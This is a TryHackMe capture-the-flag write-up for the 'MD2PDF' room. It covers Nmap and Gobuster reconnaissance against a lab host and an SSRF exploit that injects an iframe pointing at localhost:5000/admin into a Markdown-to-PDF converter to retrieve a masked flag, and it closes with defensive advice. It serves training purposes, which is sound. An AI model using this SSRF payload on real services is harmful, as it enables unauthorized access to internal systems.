# MD2PDF - TryHackMe CTF Writeup

## Executive Summary

This report details the penetration testing of the MD2PDF challenge on TryHackMe, classified as an Easy difficulty CTF. The target machine hosts a web application that converts Markdown to PDF. Through reconnaissance and enumeration, a vulnerability in the application's input handling was identified, allowing for Server-Side Request Forgery (SSRF) via iframe injection. Exploitation led to accessing an internal admin panel and retrieving the flag.

**Key Findings:**
- Open ports: 22 (SSH), 80 (HTTP)
- Vulnerability: SSRF through Markdown to PDF conversion
- Flag obtained: flag{****************}

## Methodology

The assessment followed a standard penetration testing methodology:
1. **Reconnaissance**: Port scanning and service enumeration using Nmap.
2. **Enumeration**: Directory and file discovery using Gobuster.
3. **Vulnerability Analysis**: Manual inspection of web application behavior.
4. **Exploitation**: Crafting payloads to bypass restrictions and access internal resources.
5. **Post-Exploitation**: Flag retrieval and documentation.

Tools used:
- Nmap for network scanning
- Gobuster for web directory enumeration
- Browser for manual interaction

## Reconnaissance

### Port Scanning with Nmap

The initial step involved scanning the target IP (10.201.63.111) to identify open ports and services.

**Command Executed:**
```bash
nmap -sC -sV 10.201.63.111 -oN nmap_report
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 00:10 WIB
WARNING: Service 10.201.63.111:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.201.63.111
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d7:95:1e:b6:fe:11:c6:97:30:33:b6:a5:2a:f5:75:07 (RSA)
|   256 1b:41:b6:42:36:42:e2:78:ef:a2:22:c8:f4:a3:c3:e8 (ECDSA)
|_  256 72:62:2d:7a:c6:66:16:e3:56:45:0f:85:79:8c:ff:e2 (ED25519)
80/tcp open  rtsp
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
|_http-title: MD2PDF
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=11/2%Time=69063F08%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,AB5,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nContent-Length:\x202660\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"ut
SF:f-8\"\x20/>\n\x20\x20\x20\x20<meta\n\x20\x20\x20\x20\x20\x20name=\"view
SF:port\"\n\x20\x20\x20\x20\x20\x20content=\"width=device-width,\x20initia
SF:l-scale=1,\x20shrink-to-fit=no\"\n\x20\x20\x20\x20/>\n\n\x20\x20\x20\x2
SF:0<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\x2
SF:0\x20href=\"\./static/codemirror\.min\.css\"/>\n\n\x20\x20\x20\x20<link
SF:\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\x20\x20h
SF:ref=\"\./static/bootstrap\.min\.css\"/>\n\n\x20\x20\x20\x20\n\x20\x20\x
SF:20\x20<title>MD2PDF</title>\n\x20\x20</head>\n\n\x20\x20<body>\n\x20\x2
SF:0\x20\x20<!--\x20Navigation\x20-->\n\x20\x20\x20\x20<nav\x20class=\"nav
SF:bar\x20navbar-expand-md\x20navbar-dark\x20bg-dark\">\n\x20\x20\x20\x20\
SF:x20\x20<div\x20class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<a
SF:\x20class=\"navbar-brand\"\x20href=\"/\"><span\x20class=\"\">MD2PDF</sp
SF:an></a>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20</nav>\n\n\x20
SF:\x20\x20\x20<!--\x20Page\x20Content\x20-->\n\x20\x20\x20\x20<div\x20cla
SF:ss=\"container\">\n\x20\x20\x20\x20\x20\x20<div\x20class=\"\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<div\x20class=\"card\x20mt-4\">\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<textarea\x20class=\"form-control\"\x20name=
SF:\"md\"\x20id=\"md\"></textarea>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>
SF:\n\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"mt-3\x20")%r(HTTPOp
SF:tions,69,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x200
SF:\r\n\r\n")%r(RTSPRequest,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nC
SF:ontent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,13F,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD
SF:\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<
SF:h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found
SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu
SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p
SF:>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
```

**Analysis:**
- Port 22: SSH service running OpenSSH 8.2p1 on Ubuntu.
- Port 80: HTTP service, identified as MD2PDF application. The service fingerprint shows a web page with a textarea for Markdown input, suggesting the app converts MD to PDF.
- The application appears to be a simple web tool for Markdown to PDF conversion.

## Enumeration

### Directory Brute-Forcing with Gobuster

To discover hidden directories and files, Gobuster was used with the common wordlist.

**Command Executed:**
```bash
gobuster dir -u http://10.201.63.111 -w /usr/share/wordlists/dirb/common.txt
```

**Output:**
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.63.111
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 166]
```

**Analysis:**
- The `/admin` directory was discovered, returning a 403 Forbidden status.
- Accessing http://10.201.63.111/admin directly shows: "Forbidden This page can only be seen internally (localhost:5000)"

This indicates the admin panel is restricted to localhost access, suggesting a potential SSRF vulnerability if the application can be tricked into making requests to internal resources.

## Vulnerability Analysis

The MD2PDF application allows users to input Markdown content, which is then converted to PDF. Markdown supports HTML tags, including `<iframe>`, which can embed external content.

The `/admin` endpoint is only accessible from localhost (127.0.0.1 or localhost:5000). By injecting an iframe pointing to `http://localhost:5000/admin` in the Markdown input, the PDF generation process (likely running server-side) will render the iframe, effectively accessing the internal admin page and including its content in the generated PDF.

This is a Server-Side Request Forgery (SSRF) vulnerability, where the server is tricked into making requests to internal resources.

## Exploitation

### Step-by-Step Exploitation

1. **Access the MD2PDF Web Application:**
   - Open a web browser and navigate to http://10.201.63.111.
   - The page displays a textarea for Markdown input and a "Convert to PDF" button.

2. **Craft the Payload:**
   - In the textarea, paste the following Markdown/HTML code:
     ```
     <iframe src="http://localhost:5000/admin"></iframe>
     ```
   - This creates an iframe that attempts to load the internal admin page.

3. **Generate the PDF:**
   - Click the "Convert to PDF" button.
   - The server processes the Markdown, renders the iframe (accessing localhost:5000/admin), and includes the admin page content in the PDF.

4. **Retrieve the Flag:**
   - Download and open the generated PDF.
   - The PDF will contain the content of the admin page, including the flag.

**Note:** Ensure the iframe src uses `localhost` or `127.0.0.1` with the correct port (5000) as indicated by the error message.

## Flag Capture

Upon successful exploitation, the generated PDF contains the admin page content, revealing the flag:

```
flag{****************}
```

## Conclusion

The MD2PDF CTF challenge demonstrated a common web vulnerability: SSRF via input sanitization flaws in user-generated content. Key takeaways include:
- Always validate and sanitize user inputs, especially when processing HTML or Markdown.
- Restrict access to internal resources properly.
- Regular security assessments can prevent such issues.

This writeup provides a detailed, step-by-step guide for educational purposes, allowing others to replicate the process safely in a controlled CTF environment.
